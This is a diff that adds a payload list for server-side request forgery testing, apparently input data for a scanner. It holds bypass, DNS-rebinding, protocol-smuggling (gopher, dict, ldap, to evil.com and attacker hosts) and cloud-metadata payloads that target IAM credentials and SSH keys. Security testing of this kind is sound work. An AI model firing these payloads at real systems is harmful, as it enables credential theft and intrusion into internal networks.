@@ -1,0 +1,27 @@
+# OOB/template SSRF payloads (callback infra, placeholders, or environment-specific values required)
+# Format: payload||attack_type||risk_level||expected_signature(optional)
+http://spoofed.[BURP_COLLABORATOR]||bypass_domain||high||
+http://spoofed.redacted.oastify.com||oob_candidate||high||
+https://307.r3dir.me/--to/?url=http://localhost||redirect_bypass||high||
+https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me||redirect_bypass||high||(ami-id|instance-id|hostname|local-ipv4|computeMetadata)
+make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms||dns_rebinding||high||
+ssrf.php?url=http://127.0.0.1:22||http_probe||medium||
+ssrf.php?url=http://127.0.0.1:80||http_probe||medium||
+ssrf.php?url=http://127.0.0.1:443||http_probe||medium||
+dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>||protocol_smuggling||high||
+ssrf.php?url=dict://attacker:11111/||protocol_smuggling||high||
+ssrf.php?url=sftp://evil.com:11111/||protocol_smuggling||high||
+ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET||protocol_smuggling||high||
+ssrf.php?url=ldap://localhost:11211/%0astats%0aquit||protocol_smuggling||high||
+ssrf.php?url=netdoc:///etc/passwd||protocol_smuggling||high||root:x:0:0:
+gopher://[host]:[port]/[type][selector]||protocol_smuggling||high||
+gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A||protocol_smuggling||high||
+https://example.com/ssrf.php?url=http://brutelogic.com.br/poc.svg||upgrade_to_xss||medium||
+Static:http://nicob.net/redir6a||cloud_redirect||high||
+Dynamic:http://nicob.net/redir-http-169.254.169.254:80-||cloud_redirect||high||
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]||cloud_metadata||critical||(AccessKeyId|SecretAccessKey|Token)
+http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key||cloud_metadata||critical||(ssh-rsa|ssh-ed25519)
+http://169.254.170.2/v2/credentials/<UUID>||cloud_metadata||critical||(AccessKeyId|SecretAccessKey|Token)
+http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next||cloud_runtime||high||
+https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA||cloud_api||medium||
+http://rancher-metadata/<version>/<path>||rancher_metadata||high||
